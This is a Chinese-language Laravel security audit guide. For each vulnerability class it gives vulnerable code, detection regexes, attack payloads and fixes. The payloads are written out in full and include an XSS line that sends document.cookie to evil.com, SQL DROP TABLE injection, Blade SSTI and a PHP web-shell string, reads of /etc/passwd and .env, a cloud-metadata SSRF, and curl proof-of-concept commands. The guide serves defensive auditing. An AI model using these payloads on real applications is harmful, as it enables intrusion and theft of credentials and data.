# Laravel Security Audit Guide

> Laravel Framework 安全审计模块
> 适用于: Laravel 8.x/9.x/10.x/11.x

## 核心危险面

Laravel 作为 PHP 生态最流行的框架，其特有的 Eloquent ORM、Blade 模板引擎、路由系统和序列化机制带来独特的安全挑战：Mass Assignment、反序列化RCE、SQL注入、SSTI等。

---

## Mass Assignment 漏洞检测

```php
// 危险操作
User::create($request->all());              // ❌ High: 批量赋值攻击
$user->fill($request->input());             // ❌ High
$user->update($request->only(['name']));    // ❌ 如果未正确配置

// 审计正则
::create\s*\(\s*\$request->all\(\)|->fill\s*\(\s*\$request->|->update\s*\(\s*\$request->

// 漏洞示例
public function updateProfile(Request $request) {
    $user = Auth::user();
    $user->update($request->all());  // ❌ Critical: 可修改任意字段
    return redirect('/profile');
}

// 攻击载荷
POST /profile
{
  "name": "Attacker",
  "is_admin": true,       // ← 提权
  "role": "admin",
  "credits": 999999
}

// 安全修复方法1: 使用 $fillable 白名单
class User extends Model {
    protected $fillable = ['name', 'email', 'bio'];  // ✓ 仅允许这些字段
    // 或使用 $guarded 黑名单
    protected $guarded = ['id', 'is_admin', 'role'];  // ✓ 禁止这些字段
}

// 安全修复方法2: 显式指定字段
public function updateProfile(Request $request) {
    $user = Auth::user();
    $user->update([
        'name' => $request->input('name'),
        'email' => $request->input('email'),
    ]);  // ✓ 明确控制
}

// 安全修复方法3: 使用 validated()
public function updateProfile(UserRequest $request) {
    $user = Auth::user();
    $user->update($request->validated());  // ✓ 仅更新验证通过的字段
}
```

---

## SQL 注入检测

```php
// 危险操作 - Raw Queries
DB::select("SELECT * FROM users WHERE id = " . $id);  // ❌ Critical
DB::statement("DELETE FROM users WHERE role = '$role'");  // ❌

// 危险操作 - Query Builder
DB::table('users')->whereRaw("name = '$name'")->get();  // ❌
User::whereRaw("email = '$email'")->first();  // ❌

// 危险操作 - orderByRaw / groupByRaw
User::orderByRaw($request->input('sort'))->get();  // ❌

// 审计正则
DB::(select|statement|raw|delete|update|insert)\s*\(.*\$|whereRaw.*\$|orderByRaw.*\$
havingRaw|groupByRaw

// 漏洞示例
public function search(Request $request) {
    $keyword = $request->input('keyword');
    $users = DB::select("SELECT * FROM users WHERE name LIKE '%{$keyword}%'");  // ❌
    return view('users', compact('users'));
}

// 攻击载荷
GET /search?keyword=' OR '1'='1
GET /search?keyword='; DROP TABLE users--

// 安全修复 - 参数化查询
$users = DB::select(
    "SELECT * FROM users WHERE name LIKE ?",
    ['%' . $keyword . '%']
);  // ✓

// 使用 Query Builder (最佳)
$users = User::where('name', 'like', '%' . $keyword . '%')->get();  // ✓

// whereRaw 安全用法
User::whereRaw('YEAR(created_at) = ?', [$year])->get();  // ✓ 带参数绑定

// orderBy 安全用法
$allowedColumns = ['name', 'created_at', 'email'];
$sort = $request->input('sort', 'name');
if (!in_array($sort, $allowedColumns)) {
    $sort = 'name';
}
User::orderBy($sort)->get();  // ✓ 白名单验证
```

---

## Laravel 反序列化 RCE

```php
// 危险操作
unserialize($request->cookie('user'));      // ❌ Critical: 反序列化用户输入
unserialize(base64_decode($data));          // ❌ Critical
unserialize(file_get_contents($path));      // ❌ 如果路径可控

// Laravel 特有的反序列化链
// APP_KEY 泄露 → 伪造加密Cookie → RCE

// 审计正则
unserialize\s*\(|APP_KEY\s*=|Illuminate\\.*__destruct

// 漏洞场景1: APP_KEY 泄露
// .env 文件泄露
APP_KEY=base64:YourSecretKeyHere  // ❌ 如果泄露可伪造签名

// 检查点
- .env 是否在 .gitignore
- 是否在公开仓库中
- debug 模式是否泄露
- /.env HTTP 访问是否被拦截

// 漏洞场景2: 直接反序列化
public function processData(Request $request) {
    $data = $request->input('data');
    $object = unserialize(base64_decode($data));  // ❌ Critical
    return $object->process();
}

// Laravel POP链示例 (CVE-2021-3129)
- Illuminate\Broadcasting\PendingBroadcast::__destruct()
- Illuminate\Events\Dispatcher::dispatch()
- Illuminate\Bus\Dispatcher::dispatchNow()
- Illuminate\Foundation\Application::call()

// 安全措施
// 1. 保护 APP_KEY
APP_KEY=base64:$(openssl rand -base64 32)  # 强随机密钥
# 绝不提交到版本控制

// 2. 避免反序列化用户输入
$data = json_decode($request->input('data'));  // ✓ 使用 JSON

// 3. 禁止 .env 访问
# .htaccess
<Files .env>
    Order allow,deny
    Deny from all
</Files>

# nginx
location ~ /\.env {
    deny all;
}

// 4. 升级到安全版本
Laravel 8.83.27+ / 9.5.1+
```

---

## Blade 模板注入 (SSTI)

```php
// 危险操作
{!! $userInput !!}                           // ❌ High: 不转义输出HTML
@php echo $request->input('code'); @endphp   // ❌ Critical: 执行PHP代码
Blade::render($template)                     // ❌ 如果$template用户可控

// 审计正则
\{\!\!.*\$|@php\s+.*\$request|Blade::render.*\$request

// 漏洞示例1: 不转义输出
<div class="bio">
    {!! $user->bio !!}  // ❌ High: XSS
</div>

// 攻击载荷
POST /profile
bio=<script>fetch('https://evil.com?c='+document.cookie)</script>

// 漏洞示例2: 动态模板
public function render(Request $request) {
    $template = $request->input('template');
    return Blade::render($template, ['user' => Auth::user()]);  // ❌ Critical: SSTI
}

// 攻击载荷
POST /render
template={{ system('id') }}
template=@php system($_GET['cmd']); @endphp

// 安全修复
// 使用 {{ }} 自动转义
<div class="bio">
    {{ $user->bio }}  // ✓ HTML转义
</div>

// 如果必须输出HTML，使用 Purifier
<div class="bio">
    {!! clean($user->bio) !!}  // ✓ 使用 HTMLPurifier
</div>

// 禁止用户控制模板
// 使用预定义模板列表
$allowedTemplates = ['profile', 'dashboard'];
$template = $request->input('template', 'profile');
if (!in_array($template, $allowedTemplates)) {
    abort(400);
}
return view($template);  // ✓
```

---

## 路径遍历和文件操作

```php
// 危险操作
Storage::get($request->input('file'));       // ❌ High: 路径遍历
file_get_contents($path);                    // ❌ 如果$path用户可控
File::delete($request->input('path'));       // ❌ Critical: 任意文件删除
include($request->input('page') . '.php');   // ❌ Critical: 文件包含

// 审计正则
Storage::(get|put|delete).*\$request|file_get_contents.*\$request
File::(get|put|delete).*\$request|include.*\$request|require.*\$request

// 漏洞示例
public function download(Request $request) {
    $filename = $request->input('file');
    $path = storage_path('app/files/' . $filename);
    return response()->download($path);  // ❌ High: 路径遍历
}

// 攻击载荷
GET /download?file=../../.env
GET /download?file=../../../etc/passwd

// 安全修复
public function download(Request $request) {
    $filename = $request->input('file');

    // 1. 验证文件名
    if (strpos($filename, '..') !== false || strpos($filename, '/') !== false) {
        abort(403);
    }

    // 2. 白名单扩展名
    $ext = pathinfo($filename, PATHINFO_EXTENSION);
    if (!in_array($ext, ['pdf', 'jpg', 'png'])) {
        abort(403);
    }

    // 3. 使用真实路径验证
    $basePath = storage_path('app/files');
    $fullPath = realpath($basePath . '/' . $filename);

    if (!$fullPath || strpos($fullPath, $basePath) !== 0) {
        abort(403);
    }

    // 4. 检查文件存在
    if (!Storage::disk('files')->exists($filename)) {
        abort(404);
    }

    return Storage::disk('files')->download($filename);  // ✓
}

// 文件包含安全化
$allowedPages = ['home', 'about', 'contact'];
$page = $request->input('page', 'home');
if (!in_array($page, $allowedPages)) {
    abort(404);
}
return view($page);  // ✓ 使用 view() 而非 include
```

---

## SSRF 检测

```php
// 危险操作
Http::get($request->input('url'));           // ❌ High: SSRF
file_get_contents($url);                     // ❌
Guzzle\Client->get($url);                    // ❌

// 审计正则
Http::(get|post|request).*\$request|file_get_contents.*\$request
Guzzle.*->get.*\$request

// 漏洞示例
use Illuminate\Support\Facades\Http;

public function fetch(Request $request) {
    $url = $request->input('url');
    $response = Http::get($url);  // ❌ High: SSRF
    return $response->json();
}

// 攻击载荷
GET /fetch?url=http://169.254.169.254/latest/meta-data/
GET /fetch?url=http://localhost:6379/
GET /fetch?url=file:///etc/passwd

// 安全修复
public function fetch(Request $request) {
    $url = $request->input('url');

    // 1. URL验证
    $parsed = parse_url($url);
    if (!$parsed || !isset($parsed['scheme'], $parsed['host'])) {
        abort(400, 'Invalid URL');
    }

    // 2. 协议白名单
    if (!in_array($parsed['scheme'], ['http', 'https'])) {
        abort(403, 'Invalid protocol');
    }

    // 3. 主机白名单
    $allowedHosts = ['api.example.com', 'cdn.example.com'];
    if (!in_array($parsed['host'], $allowedHosts)) {
        abort(403, 'Host not allowed');
    }

    // 4. 禁止内网IP
    $ip = gethostbyname($parsed['host']);
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
        abort(403, 'Internal IP not allowed');
    }

    $response = Http::timeout(5)->get($url);  // ✓
    return $response->json();
}
```

---

## 认证和授权绕过

```php
// 危险操作
// 未验证所有权
public function deletePost($id) {
    Post::find($id)->delete();  // ❌ High: IDOR
}

// 弱认证检查
if ($request->header('X-Admin') == 'true') {  // ❌ Critical
    // admin actions
}

// 基于客户端的授权
if ($request->input('role') == 'admin') {  // ❌ Critical
    // ...
}

// 审计正则
->delete\(\)|->update\(\)  # 检查是否有授权验证
\$request->(input|header).*==.*admin

// 漏洞示例1: IDOR
public function updatePost(Request $request, $id) {
    $post = Post::findOrFail($id);
    $post->update($request->all());  // ❌ 未检查所有权
    return redirect()->back();
}

// 攻击场景
PUT /posts/123  // 修改他人文章

// 漏洞示例2: 权限绕过
Route::group(['prefix' => 'admin'], function () {
    Route::get('/users', [AdminController::class, 'users']);
});
// ❌ 缺少 middleware('auth') 或 can() 检查

// 安全修复1: Policy授权
// app/Policies/PostPolicy.php
public function update(User $user, Post $post) {
    return $user->id === $post->user_id;  // ✓
}

// Controller
public function updatePost(Request $request, Post $post) {
    $this->authorize('update', $post);  // ✓ 检查授权
    $post->update($request->validated());
    return redirect()->back();
}

// 安全修复2: 中间件
Route::group(['middleware' => ['auth', 'role:admin']], function () {
    Route::get('/admin/users', [AdminController::class, 'users']);
});  // ✓

// 安全修复3: Gate
if (Gate::denies('update-post', $post)) {
    abort(403);
}
```

---

## CSRF 保护检测

```php
// 危险配置
// app/Http/Middleware/VerifyCsrfToken.php
protected $except = [
    '*',                 // ❌ Critical: 全局禁用
    'api/*',             // ⚠️ API端点需其他保护
    '/webhook/*'         // ✓ 合理(外部回调)
];

// 审计正则
VerifyCsrfToken.*\$except|@csrf  # 检查是否正确使用

// 漏洞场景
// 状态改变操作未启用CSRF
Route::post('/transfer', [TransferController::class, 'transfer']);
// ❌ 如果在 $except 中

// 安全措施
// 1. 仅对必要路径禁用CSRF
protected $except = [
    'webhook/stripe',    // ✓ 第三方回调
    'webhook/paypal',
];

// 2. Blade 模板中包含 CSRF token
<form method="POST" action="/transfer">
    @csrf  // ✓ 生成隐藏的 CSRF token
    <input type="text" name="amount">
    <button type="submit">Transfer</button>
</form>

// 3. AJAX 请求包含 CSRF token
// resources/js/bootstrap.js
axios.defaults.headers.common['X-CSRF-TOKEN'] = document.querySelector('meta[name="csrf-token"]').content;

// 4. API 使用 Sanctum 而非禁用 CSRF
Route::middleware('auth:sanctum')->post('/api/transfer', ...);
```

---

## 开放重定向检测

```php
// 危险操作
return redirect($request->input('url'));     // ❌ Medium
return redirect()->intended($request->input('next'));  // ❌

// 审计正则
redirect\s*\(\s*\$request|redirect\(\)->.*\$request

// 漏洞示例
public function logout(Request $request) {
    Auth::logout();
    $next = $request->input('redirect');
    return redirect($next);  // ❌ Medium: 开放重定向
}

// 攻击载荷
GET /logout?redirect=https://evil.com/phishing

// 安全修复
public function logout(Request $request) {
    Auth::logout();

    $next = $request->input('redirect', '/');

    // 方法1: 仅允许相对路径
    if (parse_url($next, PHP_URL_HOST) !== null) {
        $next = '/';
    }

    // 方法2: 白名单验证
    $allowedDomains = ['example.com', 'app.example.com'];
    $host = parse_url($next, PHP_URL_HOST);
    if ($host && !in_array($host, $allowedDomains)) {
        $next = '/';
    }

    return redirect($next);  // ✓
}

// 方法3: 使用 route() 或 action()
return redirect()->route('home');  // ✓ 最安全
return redirect()->action([HomeController::class, 'index']);  // ✓
```

---

## XXE 漏洞检测

```php
// 危险操作
$xml = simplexml_load_string($request->input('xml'));  // ❌ High: XXE
$dom = new DOMDocument();
$dom->loadXML($xmlString);  // ❌ 默认不安全

// 审计正则
simplexml_load_(string|file)|DOMDocument.*loadXML|XMLReader

// 攻击载荷
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

// 安全修复
// 禁用外部实体
libxml_disable_entity_loader(true);  // PHP < 8.0

$dom = new DOMDocument();
$dom->loadXML($xmlString, LIBXML_NOENT | LIBXML_DTDLOAD | LIBXML_DTDATTR);  // ❌ 危险标志

// ✓ 安全加载
$dom = new DOMDocument();
$dom->loadXML($xmlString, LIBXML_NOCDATA | LIBXML_NONET);  // ✓

// 最佳实践: 避免XML，使用JSON
$data = json_decode($request->input('data'), true);  // ✓
```

---

## 命令注入检测

```php
// 危险操作
exec($request->input('cmd'));                // ❌ Critical
shell_exec("ping " . $host);                 // ❌
system("convert " . $file);                  // ❌
`whoami $user`;                              // ❌ 反引号执行

// 审计正则
exec\s*\(.*\$|shell_exec.*\$|system\s*\(.*\$|passthru.*\$|`.*\$

// 漏洞示例
public function ping(Request $request) {
    $host = $request->input('host');
    $output = shell_exec("ping -c 4 " . $host);  // ❌ Critical
    return $output;
}

// 攻击载荷
GET /ping?host=google.com;whoami
GET /ping?host=`cat /etc/passwd`

// 安全修复
public function ping(Request $request) {
    $host = $request->input('host');

    // 1. 验证格式
    if (!filter_var($host, FILTER_VALIDATE_IP) && !filter_var($host, FILTER_VALIDATE_DOMAIN)) {
        abort(400, 'Invalid host');
    }

    // 2. 使用 escapeshellarg
    $output = shell_exec("ping -c 4 " . escapeshellarg($host));  // ✓

    return $output;
}

// 最佳实践: 避免 shell，使用原生函数
// ❌ shell_exec("rm " . $file);
// ✓ File::delete($file);

// ❌ exec("cp $src $dst");
// ✓ File::copy($src, $dst);
```

---

## 敏感信息泄露

```php
// 危险配置
// config/app.php
'debug' => true,                             // ❌ 生产环境启用debug

// .env 泄露
APP_DEBUG=true                               // ❌ 生产环境
DB_PASSWORD=secret123                        // ❌ 如果.env泄露

// 代码泄露
return response()->json($exception);         // ❌ 异常对象泄露
dd($user);                                   // ❌ 调试输出忘记删除
Log::debug($request->all());                 // ❌ 密码记录到日志

// 审计正则
APP_DEBUG=true|dd\(|dump\(|var_dump\(|print_r\(
Log::.*password

// 安全措施
// 1. 生产环境配置
APP_ENV=production
APP_DEBUG=false
LOG_LEVEL=error

// 2. 自定义错误页面
// resources/views/errors/500.blade.php
@if(config('app.debug'))
    {{ $exception->getMessage() }}
@else
    Something went wrong.  // ✓ 通用错误
@endif

// 3. 日志脱敏
Log::info('Login attempt', [
    'email' => $email,
    'password' => '***',  // ✓ 不记录密码
]);

// 4. 保护 .env
# .gitignore
.env
.env.backup

# nginx
location ~ /\.env {
    deny all;
}
```

---

## 速率限制和暴力破解

```php
// 缺少速率限制
Route::post('/login', [AuthController::class, 'login']);  // ❌ 无限重试

// 审计正则
Route::post.*login|Route::post.*register  # 检查是否有throttle

// 安全措施
// 1. 使用内置throttle中间件
Route::post('/login', [AuthController::class, 'login'])
    ->middleware('throttle:5,1');  // ✓ 每分钟5次

// 2. 自定义速率限制
// app/Providers/RouteServiceProvider.php
RateLimiter::for('login', function (Request $request) {
    return Limit::perMinute(5)->by($request->input('email'));  // ✓ 按邮箱限制
});

Route::post('/login', [AuthController::class, 'login'])
    ->middleware('throttle:login');

// 3. 使用验证码
// 登录失败3次后要求验证码
```

---

## 搜索模式汇总

```regex
# Mass Assignment
::create\s*\(\s*\$request->all|->fill\s*\(\s*\$request

# SQL注入
DB::(select|statement).*\$|whereRaw.*\$|orderByRaw.*\$request

# 反序列化
unserialize\s*\(|APP_KEY\s*=

# SSTI
\{\!\!.*\$|@php.*\$request|Blade::render.*\$request

# 路径遍历
Storage::(get|delete).*\$request|include.*\$request

# SSRF
Http::(get|post).*\$request|file_get_contents.*\$request

# 命令注入
exec\s*\(.*\$|shell_exec|system\s*\(|passthru|`

# 授权
->delete\(\)|->update\(\)  # 检查是否有authorize

# CSRF
VerifyCsrfToken.*\$except

# 敏感信息
APP_DEBUG=true|dd\(|var_dump\(

# 开放重定向
redirect\s*\(\s*\$request
```

---

## 快速审计检查清单

```markdown
[ ] 检查 composer.json 依赖版本
[ ] 检查 .env 是否在 .gitignore
[ ] 检查 APP_DEBUG 生产环境配置
[ ] 搜索 create/fill/update ($request->all)
[ ] 检查 Model 的 $fillable/$guarded
[ ] 搜索 whereRaw/orderByRaw (SQL注入)
[ ] 检查 unserialize 和 APP_KEY 泄露
[ ] 搜索 {!! (Blade不转义输出)
[ ] 检查文件操作的路径拼接
[ ] 检查 Http::get/file_get_contents (SSRF)
[ ] 检查 exec/shell_exec (命令注入)
[ ] 检查 Policy 和 authorize 使用
[ ] 检查 VerifyCsrfToken 的 $except
[ ] 检查 redirect 开放重定向
[ ] 检查登录/注册接口的速率限制
```

---

## 最小 PoC 示例
```bash
# Blade SSTI/未转义输出
curl "http://localhost/profile?name={{7*7}}"

# SQL 注入 (whereRaw)
curl "http://localhost/users?orderByRaw=id desc;select version()"

# SSRF
curl "http://localhost/fetch?url=http://169.254.169.254/latest/meta-data/"
```

---

## 参考资源

- [Laravel Security Best Practices](https://laravel.com/docs/security)
- [OWASP Laravel Security](https://cheatsheetseries.owasp.org/cheatsheets/Laravel_Cheat_Sheet.html)
- [Laravel CVEs](https://www.cvedetails.com/vulnerability-list/vendor_id-16542/Laravel.html)
- [Enlightn Security Scanner](https://github.com/enlightn/enlightn)
